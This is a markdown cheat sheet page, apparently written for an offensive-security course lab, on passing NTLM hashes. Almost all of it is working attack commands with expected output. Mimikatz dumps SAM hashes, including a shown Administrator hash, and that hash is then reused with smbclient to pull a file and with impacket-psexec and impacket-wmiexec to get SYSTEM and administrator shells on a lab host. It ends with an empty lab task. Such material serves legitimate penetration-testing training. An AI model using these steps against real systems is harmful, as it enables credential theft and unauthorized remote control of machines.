# Passing NTLM

RDP Connection as nelly
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Passing-NTLM-1.png)

Enabling SeDebugPrivilege, retrieving SYSTEM user privileges and extracting NTLM hashes
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
>
>mimikatz # token::elevate
>...
># =====================================
>
>mimikatz # lsadump::sam
>
># ========== Expected Result ==========
>...
>RID  : 000001f4 (500)
>User : Administrator
>  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
>...
># =====================================
>```

Using smbclient with NTLM hash
>``` shell
>kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
>
># ========== Expected Result ==========
>Try "help" to get a list of possible commands.
>smb: \> dir
>  .                                   D        0  Thu Jun  2 16:55:37 2022
>  ..                                DHS        0  Thu Jun  2 16:55:35 2022
>  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022
>
>                4554239 blocks of size 4096. 771633 blocks available
># =====================================
>
>smb: \> get secrets.txt
>
># ========== Expected Result ==========
>getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
># =====================================
>```

Using psexec to get an interactive shell
>``` shell
>kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>[*] Requesting shares on 192.168.50.212.....
>[*] Found writable share ADMIN$
>[*] Uploading file nvaXenHl.exe
>[*] Opening SVCManager on 192.168.50.212.....
>[*] Creating service MhCl on 192.168.50.212.....
>[*] Starting service MhCl.....
>[!] Press help for extra shell commands
>Microsoft Windows [Version 10.0.20348.707]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Windows\system32> hostname
>
># ========== Expected Result ==========
>FILES02
># =====================================
>
>C:\Windows\system32> ipconfig
>
># ========== Expected Result ==========
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0:
>
>   Connection-specific DNS Suffix  . : 
>   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
>   IPv4 Address. . . . . . . . . . . : 192.168.50.212
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.50.254
># =====================================
>
>C:\Windows\system32> whoami
>
># ========== Expected Result ==========
>nt authority\system
># =====================================
>
>C:\Windows\system32> exit
>
>kali@kali:~$
>```

Using wmiexec to get an interactive shell
>``` shell
>kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
>
># ========== Expected Result ==========
>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
>
>[*] SMBv3.0 dialect used
>[!] Launching semi-interactive shell - Careful what you execute
>[!] Press help for extra shell commands
># =====================================
>
>C:\>whoami
>
># ========== Expected Result ==========
>files02\administrator
># =====================================
>
>C:\>
>```

Lab 1 - Use the methods from this section to get access to VM #2 and find the flag on the desktop of the user Administrator.
>``` shell
>
>```
>
